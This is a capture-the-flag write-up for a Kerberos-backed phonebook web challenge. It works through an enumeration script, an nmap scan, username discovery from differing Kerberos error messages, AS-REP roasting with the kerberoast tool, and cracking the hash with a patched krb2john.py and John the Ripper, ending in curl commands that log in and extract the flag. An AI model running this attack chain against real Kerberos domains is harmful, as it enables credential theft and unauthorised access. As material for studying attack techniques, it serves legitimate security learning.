#### Challenge:

Hi Expert,

the archaeologists are looking forward to get some phone numbers from the phone book running on `http://78.128.246.142`, don't make them wait too long.

Good Luck!

---

#### Solution:

We are provided with a site that claims it is some kind of `phonebook`.

It has 2 functions:

1. It allows to search for persons in the phonebook by inputting any `at least 2 character` string (case insensitively)
2. It has simple login interface with fields `username`, `password` and `realm` that has force-fixed value `SUPERPHONEBOOK.TCC`

Using this script:

```python
#!/usr/bin/env python3

import requests
import string
import re

ses = requests.session()
r = ses.get('http://78.128.246.142')

phonebook = []

for a in list(string.ascii_lowercase):
    for b in list(string.ascii_lowercase):
        data = {
          "query": f"{a}{b}"
        }
        r = ses.post(f"http://78.128.246.142/search", data=data)

        matches = re.findall(r"<li>.*?</li>",str(r.content))
        if matches:
            for i in range(len(matches)):
                phonebook.append(matches[i])

# deduplicate
phonebook_uniq = (list(set(phonebook)))

for string in phonebook_uniq:
    print(string.replace("<p>", "").replace("<li>", "").replace("</li>", "").replace("\\t", "").replace("\\n", "\n"))
```

We enumerated all entries in the phonebook to get:

```text
email: tytso@superphonebook.tcc
name: Theodore Ts&#39;o
homepage:
phone: anonymous phone search disabled


email: bill@superphonebook.tcc
name: Bill Bryant
homepage: https://web.mit.edu/kerberos/www/dialogue.html
phone: anonymous phone search disabled


email: aaron@superphonebook.tcc
name: Aaron Spelling
homepage: http://enumerate.more
phone: anonymous phone search disabled


email: harmj0y@superphonebook.tcc
name: Will Schroeder
homepage: https://www.harmj0y.net
phone: anonymous phone search disabled
```

Following the advice from a hint we checked other services on the server:

```bash
nmap -v -PE 78.128.246.142
```

to find out that there is kerberos running on port 88:

```text
PORT    STATE    SERVICE
80/tcp  open     http
88/tcp  open     kerberos-sec
135/tcp filtered msrpc
139/tcp filtered netbios-ssn
179/tcp filtered bgp
445/tcp filtered microsoft-ds
```

Trying to log in with the combination of username part from the email and random password reveals interesting info - for users `bill`, `aaron` and `harmj0y` we get this error: `invalid credentials, ('Client not found in Kerberos database', -1765328378)` but for user `tytso` we get: `invalid credentials, ('Decrypt integrity check failed', -1765328353)`. From this, it can be assumed, that we have to somehow get the password for this user.

Putting together the fact that the server is running `kerberos`, the hint to `kerberos "dialogs"` by `Bill Bryant` in `Bill Bryant's` homepage and the fact that on the `www.harmj0y.net` is blog called `Kerberoasting Revisited`, leads us to investigate `kerberoasting` and [asreproasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast) - which we think is the point of this challenge.

Another hint points to `john` which after some time spent searching, in context with `kerberos` and `asreproasting` points to this [file](https://github.com/openwall/john/blob/bleeding-jumbo/run/krb2john.py). In the file there are instructions on how to extract hashes from `PCAP` file containing `AS-REP hashes` to format that is crackable by `John-the-Ripper`.

For `asreproasting` we used [kerberoast](https://pypi.org/project/kerberoast/).

```bash
pip3 install kerberoast
```

Then we started `wireshark` capture and after running the following command we saved the capture as `/tmp/out.pcap`:

```bash
kerberoast asreproast 78.128.246.142 -u tytso -r SUPERPHONEBOOK.TCC -e 18;
```

Then we run the following series of commands:

```bash
tshark -2 -r /tmp/out.pcap -R "tcp.srcport==88 or udp.srcport==88" -T pdml > data.pdml
python3 ./john/run/krb2john.py data.pdml > hash.txt
john hash.txt
```

But they return an error - `Unable to find kerberos.salt value. Please report this bug to us!`. Digging a bit into the `krb2john.py` code, we can see that this happens, when the `e-type` is not `23` (which isn't supported by this challenge, only `17` and `18` are) and when the `salt` for the hash is missing. Looking into the `data.pdml`, I see there is a field with name `kerberos.info2_salt` but `krb2john.py` is looking for `kerberos.salt`. Patching it in the  `krb2john.py` and rerunning the commands sucessfully returns the password of the user `tytso` to be `garfunkel4`. With that we can login and the flag is found in `tytso`'s phone number.

```bash
curl 'http://78.128.246.142/login' -s --data-raw 'username=tytso&password=garfunkel4' --cookie-jar cookies > /dev/null
curl 'http://78.128.246.142/search' -s --cookie cookies --data-raw 'query=th' | grep -oe 'FLAG{.*}'
```

---

<details><summary>FLAG:</summary>

```
FLAG{MLeq-38Tt-Y1Tz-NdE9}
```

</details>
<br/>
